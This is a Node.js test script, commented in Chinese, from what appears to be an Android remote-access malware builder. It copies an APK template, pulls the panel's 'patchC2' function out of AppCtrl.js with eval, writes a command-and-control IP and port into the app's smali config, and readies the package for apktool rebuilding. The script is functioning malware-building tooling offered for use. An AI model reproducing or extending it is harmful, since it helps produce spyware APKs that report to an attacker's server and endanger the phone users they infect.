// 端到端验证：把 Factory/piupiupiu 复制一份 -> 用 AppCtrl.patchC2 写入测试 C2 -> 供 apktool 重建。
// 目的是确认"改完 C2 之后 smali 仍然合法"，否则面板点 Build 会编出一个坏包。
//
// 用法: node tools/e2e_factory_build.js <目标目录> <ip> <port>
const fs = require('fs');
const path = require('path');

const dest = process.argv[2];
const ip = process.argv[3] || '203.0.113.7';
const port = process.argv[4] || '9999';

// patchC2 里用到 CONSTANTS.wsPath（二开改 /sync 后引入），必须在 eval 作用域里提供
const CONSTANTS = require('../piupiupiu-Server/app/app/assets/js/Constants');

const appCtrlPath = path.join(__dirname, '..', 'piupiupiu-Server', 'app', 'app', 'assets', 'js', 'controllers', 'AppCtrl.js');
const src = fs.readFileSync(appCtrlPath, 'utf8');
const start = src.indexOf('$appCtrl.patchC2 = (data, ip, port) => {');
const end = src.indexOf('\n    }\n', start);
const $appCtrl = {};
eval(src.slice(start, end + '\n    }\n'.length));

const smali = path.join(dest, 'smali', 'com', 'piupiupiu', 'AppConfig.smali');
const original = fs.readFileSync(smali, 'utf8');
const out = $appCtrl.patchC2(original, ip, port);
if (out === null) {
    console.error('FAIL: patchC2 未命中');
    process.exit(1);
}
fs.writeFileSync(smali, out);
console.log(`patched ${smali} -> http://${ip}:${port}`);
